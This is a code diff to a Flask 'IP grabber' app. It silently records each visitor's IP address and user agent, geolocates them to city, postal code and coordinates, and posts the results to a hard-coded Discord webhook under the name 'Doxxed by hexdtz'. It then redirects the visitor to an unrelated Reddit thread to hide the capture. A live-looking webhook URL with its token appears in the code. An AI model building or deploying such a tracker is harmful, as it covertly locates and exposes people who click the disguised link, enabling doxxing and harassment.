@@ -7,8 +7,10 @@ app = Flask(__name__)
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
 
+# Simple set to store already-logged IPs (not persistent, just in-memory)
+recent_ips = set()
+
 def get_visitor_info(ip, user_agent):
-    # Use ipapi.co for IP details
     ipapi_url = f"https://ipapi.co/{ip}/json/"
 
     try:
@@ -26,8 +28,8 @@ def get_visitor_info(ip, user_agent):
         "zip": details.get("postal", ""),
         "lat": details.get("latitude", 0),
         "lon": details.get("longitude", 0),
-        "date": datetime.utcnow().strftime("%d/%m/%Y"),  # Fixed to GMT/UTC
-        "time": datetime.utcnow().strftime("%H:%M:%S"),  # Fixed to GMT/UTC
+        "date": datetime.utcnow().strftime("%d/%m/%Y"),  # GMT/UTC
+        "time": datetime.utcnow().strftime("%H:%M:%S"),  # GMT/UTC
     }
     return info
 
@@ -36,7 +38,7 @@ def send_to_discord(info):
     ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
 
     embed = {
-        "username": "Made by hexdtz",
+        "username": "Doxxed by hexdtz",  # Custom name
         "avatar_url": flag_url,
         "embeds": [{
             "title": f"Visitor From {info['country']}",
@@ -62,8 +64,10 @@ def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
 
-    info = get_visitor_info(ip, user_agent)
-    send_to_discord(info)
+    if ip not in recent_ips:
+        recent_ips.add(ip)
+        info = get_visitor_info(ip, user_agent)
+        send_to_discord(info)
 
     # Redirect after capture
     return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
